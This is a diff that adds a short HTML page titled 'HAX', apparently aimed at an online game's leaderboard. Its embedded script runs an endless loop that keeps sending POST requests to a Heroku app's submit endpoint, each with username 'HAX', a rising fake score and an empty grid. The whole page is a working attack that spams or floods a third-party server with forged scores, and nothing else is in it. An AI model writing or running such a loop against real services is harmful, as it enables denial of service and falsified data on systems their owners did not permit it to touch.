@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+    <meta charset="utf-8" />
+    <title>HAX</title>
+</head>
+
+<body>
+    <script>
+
+var x = 0;
+while(true)    {
+x ++;
+
+    var request = new XMLHttpRequest();
+    request.open("POST", "https://fathomless-reaches-81301.herokuapp.com/submit", true);
+    request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    request.onreadystatechange = function(){
+        if (request.readyState == 4){
+
+        }
+    }  
+    request.send("username=" + "HAX" + "&score=" + x + "&grid=" + "{}");
+}
+
+</script>
+   <p>HAX</p>
+</body>
+</html>
